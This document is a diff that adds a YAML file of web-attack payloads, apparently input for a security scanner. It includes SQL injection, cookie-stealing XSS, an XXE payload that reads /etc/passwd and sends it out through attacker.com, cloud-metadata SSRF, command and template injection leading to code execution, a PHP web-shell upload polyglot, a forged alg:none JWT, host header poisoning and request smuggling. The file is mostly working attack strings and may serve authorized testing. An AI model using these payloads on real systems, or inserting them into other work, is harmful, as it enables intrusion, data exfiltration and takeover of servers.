@@ -1,0 +1,166 @@
+# Advanced Security Test Payloads
+
+# SQL Injection Payloads
+sql:
+  - name: "SQLi - Union Based"
+    payload: "' UNION SELECT table_name,column_name,1 FROM information_schema.columns-- -"
+    method: "GET"
+    parameters: {id: "1"}
+    severity: "critical"
+    tags: ["sqli", "union", "database"]
+
+  - name: "SQLi - Time Based"
+    payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"
+    method: "GET"
+    parameters: {id: "1"}
+    severity: "critical"
+    tags: ["sqli", "time-based", "blind"]
+
+# Cross-Site Scripting (XSS) Payloads
+xss:
+  - name: "XSS - Advanced DOM"
+    payload: "<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))/>"
+    method: "GET"
+    parameters: {input: "test"}
+    severity: "high"
+    tags: ["xss", "dom", "encoded"]
+
+  - name: "XSS - Template Literal"
+    payload: "`${alert(document.cookie)}`"
+    method: "GET"
+    parameters: {input: "test"}
+    severity: "high"
+    tags: ["xss", "template"]
+
+# XML External Entity (XXE) Payloads
+xxe:
+  - name: "XXE - Advanced OOB"
+    payload: |
+      <?xml version="1.0"?><!DOCTYPE data [
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+      <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+      %dtd;]>
+      <data>&send;</data>
+    method: "POST"
+    headers: {"Content-Type": "application/xml"}
+    severity: "critical"
+    tags: ["xxe", "oob", "exfiltration"]
+
+# Server-Side Request Forgery (SSRF) Payloads
+ssrf:
+  - name: "SSRF - Cloud Metadata"
+    payload: "http://169.254.169.254/latest/dynamic/instance-identity/document"
+    method: "GET"
+    parameters: {url: "http://169.254.169.254/latest/dynamic/instance-identity/document"}
+    severity: "critical"
+    tags: ["ssrf", "cloud", "metadata"]
+
+  - name: "SSRF - Internal Network"
+    payload: "dict://internal-api:11211/"
+    method: "GET"
+    parameters: {url: "dict://internal-api:11211/"}
+    severity: "critical"
+    tags: ["ssrf", "internal", "cache"]
+
+# Remote Code Execution (RCE) Payloads
+rce:
+  - name: "RCE - Python Code Injection"
+    payload: "__import__('os').system('id')"
+    method: "POST"
+    parameters: {code: "__import__('os').system('id')"}
+    severity: "critical"
+    tags: ["rce", "python", "code-injection"]
+
+  - name: "RCE - Command Chain"
+    payload: "|net user;whoami;systeminfo"
+    method: "GET"
+    parameters: {cmd: "test"}
+    severity: "critical"
+    tags: ["rce", "windows", "command"]
+
+# JWT Attack Payloads
+jwt:
+  - name: "JWT - Algorithm Confusion"
+    payload: "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."
+    method: "GET"
+    headers: {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."}
+    severity: "high"
+    tags: ["jwt", "alg-confusion"]
+
+# GraphQL Attack Payloads
+graphql:
+  - name: "GraphQL - Introspection"
+    payload: "{__schema{types{name,fields{name,args{name,description,type{name}}}}}}"
+    method: "POST"
+    headers: {"Content-Type": "application/json"}
+    severity: "medium"
+    tags: ["graphql", "introspection"]
+
+  - name: "GraphQL - DoS"
+    payload: "{user(id:1){friends{friends{friends{friends{id,name}}}}}}"
+    method: "POST"
+    headers: {"Content-Type": "application/json"}
+    severity: "high"
+    tags: ["graphql", "dos"]
+
+# NoSQL Injection Payloads
+nosql:
+  - name: "NoSQL - MongoDB Injection"
+    payload: "{\"$gt\":\"\"}"
+    method: "POST"
+    parameters: {"username": "{\"$gt\":\"\"}", "password": "{\"$gt\":\"\"}"}
+    severity: "high"
+    tags: ["nosql", "mongodb"]
+
+# Template Injection Payloads
+ssti:
+  - name: "SSTI - RCE Through Template"
+    payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    method: "POST"
+    parameters: {template: "test"}
+    severity: "critical"
+    tags: ["ssti", "rce", "python"]
+
+# File Upload Payloads
+file_upload:
+  - name: "File Upload - Double Extension"
+    payload: "malicious.php.jpg"
+    method: "POST"
+    content_type: "image/jpeg"
+    severity: "high"
+    tags: ["upload", "bypass"]
+
+  - name: "File Upload - Polyglot"
+    payload: "payload.php.gif"
+    content: "GIF89a<?php system($_GET['cmd']); ?>"
+    method: "POST"
+    content_type: "image/gif"
+    severity: "critical"
+    tags: ["upload", "polyglot"]
+
+# CORS Misconfiguration Payloads
+cors:
+  - name: "CORS - Wildcard Origin"
+    payload: "*"
+    method: "OPTIONS"
+    headers: {"Origin": "https://evil.com"}
+    severity: "high"
+    tags: ["cors", "misconfiguration"]
+
+# Host Header Injection Payloads
+host_header:
+  - name: "Host Header - Password Reset Poisoning"
+    payload: "evil.com"
+    method: "POST"
+    headers: {"Host": "evil.com"}
+    severity: "high"
+    tags: ["host-header", "poisoning"]
+
+# HTTP Request Smuggling Payloads
+smuggling:
+  - name: "Request Smuggling - CL.TE"
+    payload: "Content-Length: 3\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n"
+    method: "POST"
+    headers: {"Content-Length": "3", "Transfer-Encoding": "chunked"}
+    severity: "critical"
+    tags: ["smuggling", "cl-te"]
